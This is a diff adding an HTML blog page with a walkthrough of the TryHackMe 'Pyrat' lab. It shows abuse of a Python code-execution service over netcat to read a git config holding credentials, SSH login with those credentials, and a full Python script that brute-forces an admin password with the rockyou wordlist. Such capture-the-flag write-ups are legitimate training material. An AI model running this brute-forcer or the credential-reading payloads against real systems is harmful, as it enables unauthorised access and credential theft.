@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>THM Pytrat Workthrough</title>
+    <link rel="stylesheet" href="/assets/css/custom-style.css">
+    
+    <!-- Prism.js for syntax highlighting -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
+
+    
+    <!-- Clipboard.js for copy button -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.11/clipboard.min.js"></script>
+
+    <!-- Copy-code.js for copy code block in one click-->
+    <script src="/assets/js/copy-code.js"></script>
+    
+
+</head>
+<body>
+    <header>
+        <h1>🛡️<a href="/">Researcher Sheru! </a></h1>
+
+
+        
+        <nav>
+            <ul>
+                <li><a href="/">Home</a></li>
+                <li><a href="/about">About</a></li>
+                <li><a href="/blogs">Blog</a></li>
+                <li><a href="https://github.com/sheru-pan" target="_blank">GitHub</a></li>
+                <li><a href="https://www.wechall.net/profile/sheru" target="_blank">WeChall</a></li>
+
+                
+            </ul>
+        </nav>
+        <!-- <div class="social-icons"> 
+            <a href="mailto:researchersheru@gmail.com" target="_blank" title="Email">
+                <img src="https://cdn-icons-png.flaticon.com/512/732/732200.png" alt="Email">
+            </a>
+            <a href="https://github.com/sheru-pan" target="_blank" title="GitHub">
+                <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/github/github-original.svg" alt="GitHub">
+            </a>
+            <a href="https://www.linkedin.com/in/himangshu-blockchain/" target="_blank" title="LinkedIn">
+                <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/linkedin/linkedin-original.svg" alt="LinkedIn">
+            </a>
+        </div> -->
+        <a href="https://tryhackme.com/p/researchersheru" target="_blank">
+            <img src="https://tryhackme-badges.s3.amazonaws.com/researchersheru.png" alt="Your Image Badge" />
+
+        </a>
+        <div class="menu-toggle">☰</div>
+    </header>
+    <main>
+        <p class="post-meta">
+  <span class="date"
+    >📅 <strong>Published on:</strong> July 26, 2025</span
+  >
+  <span class="author">✍️ <strong>Author:</strong> Himangshu Pan</span>
+</p>
+
+<p><h1 id="tryhackme-workthrough--pyrat">TryHackMe Workthrough =&gt; Pyrat</h1>
+
+<h3 id="description">Description</h3>
+
+<p>Pyrat receives a curious response from an HTTP server, which leads to a potential Python code execution vulnerability. With a cleverly crafted payload, it is possible to gain a shell on the machine. Delving into the directories, the author uncovers a well-known folder that provides a user with access to credentials. A subsequent exploration yields valuable insights into the application’s older version. Exploring possible endpoints using a custom script, the user can discover a special endpoint and ingeniously expand their exploration by fuzzing passwords. The script unveils a password, ultimately granting access to the root.</p>
+
+<h1 id="nmap-port-scan">Nmap port scan</h1>
+
+<p>Screenshot:</p>
+
+<p><img src="/assets/images/thm/pyrat/1.png" alt="image" /></p>
+
+<p>Port ssh (22) and Hppt (8000) is open.
+Screenshot:</p>
+
+<h1 id="check-for-the-http-port-information">Check for the http port information.</h1>
+
+<p><img src="/assets/images/thm/pyrat/2.png" alt="image" /></p>
+
+<p>Basic connection ok. lets connect to port 8000 using netcat. Try to run hello world python syntax as description says there are potential python code execution vulnerability.
+Screenshot:
+<img src="/assets/images/thm/pyrat/3.png" alt="image" /></p>
+
+<p>We can execute python codes here.</p>
+
+<p>Next I will use python code execution payload further. Try to check for incomming mails.
+Screenshot:
+<img src="/assets/images/thm/pyrat/4.png" alt="image" /></p>
+
+<p>May be there is something for me in <code class="language-plaintext highlighter-rouge">think</code>. Next try to read this mail.</p>
+
+<p>Screenshot:
+<img src="/assets/images/thm/pyrat/5.png" alt="image" /></p>
+
+<p>search for git folders.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">os</span><span class="p">;</span> <span class="nf">print</span><span class="p">([</span><span class="n">r</span> <span class="k">for</span> <span class="n">r</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">ds</span> <span class="ow">in</span> <span class="n">os</span><span class="p">.</span><span class="nf">walk</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)</span> <span class="k">if</span> <span class="sh">"</span><span class="s">.git</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">d</span><span class="p">])</span>
+</code></pre></div></div>
+
+<p>Screenshot:
+<img src="/assets/images/thm/pyrat/6.png" alt="image" /></p>
+
+<p>Check git config.</p>
+
+<p><img src="/assets/images/thm/pyrat/7.png" alt="image" /></p>
+
+<p>We got username and password here. Let’s try to ssh using this credential.</p>
+
+<p>We have successfully loged in and in the home directory there is an <code class="language-plaintext highlighter-rouge">users.txt</code> file contains our first flag.</p>
+
+<h3 id="root">Root</h3>
+
+<p><img src="/assets/images/thm/pyrat/8.png" alt="image" /></p>
+
+<p>Python script to find admin password.</p>
+
+<pre><code class="language-python=">import socket
+
+
+TARGET_IP = '10.10.118.253'
+TARGET_PORT = 8000
+WORDLIST = '/usr/share/wordlists/rockyou.txt'
+
+
+with open(WORDLIST, 'r', encoding="latin-1") as f:
+    for password in f:
+        password = password.strip()
+        try:
+            s = socket.socket()
+            s.settimeout(3)
+            s.connect((TARGET_IP, TARGET_PORT))
+
+            # Send admin
+            s.sendall(b"admin\n")
+            data = s.recv(4096).decode()
+
+            # read password prompt
+            if "Password:" in data:
+                s.sendall((password + "\n").encode())
+                data = s.recv(4096).decode()
+                print(f"[TRY] Password: {password} | Response: {data.strip()}")
+
+                if "Password:" not in data:
+                    print(f"\n[SUCCESS] Password found: {password}")
+                    break
+            else:
+                print("Error: unexpected response after sending username")
+
+            s.close()
+        except Exception as e:
+            print("Error: %s " %e)
+
+</code></pre>
+
+<p>Now successfully got the admin password.
+<img src="/assets/images/thm/pyrat/9.png" alt="image" /></p>
+
+<h2 id="useful-commands">Useful commands.</h2>
+
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">nmap -sS 10.10.133.11</code></li>
+  <li><code class="language-plaintext highlighter-rouge">import os; print([r for r, d, ds in os.walk('/') if ".git" in d])</code></li>
+  <li><code class="language-plaintext highlighter-rouge">print(open("/opt/dev/.git/config").read())</code></li>
+  <li><code class="language-plaintext highlighter-rouge">ssh think@10.10.118.253</code></li>
+  <li><code class="language-plaintext highlighter-rouge">nc 10.10.118.253 8000</code></li>
+</ol>
+</p>
+</br>
+</br>
+<p ><a href="/blogs">Blogs →</a><br /></p>
+
+    </main>
+    <footer>
+        <p>&copy; 2025 Himangshu Pan. All Rights Reserved.</p>
+    </footer>
+    
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            const menuToggle = document.querySelector(".menu-toggle");
+            const nav = document.querySelector("nav");
+    
+            // Toggle nav when clicking the menu button
+            menuToggle.addEventListener("click", function (e) {
+                e.stopPropagation(); // Prevent event from bubbling to document
+                nav.classList.toggle("nav-active");
+            });
+    
+            // Prevent click inside nav from closing it
+            nav.addEventListener("click", function (e) {
+                e.stopPropagation();
+            });
+    
+            // Click anywhere else to close nav
+            document.addEventListener("click", function () {
+                nav.classList.remove("nav-active");
+            });
+        });
+    </script>
+    
+</body>
+</html>
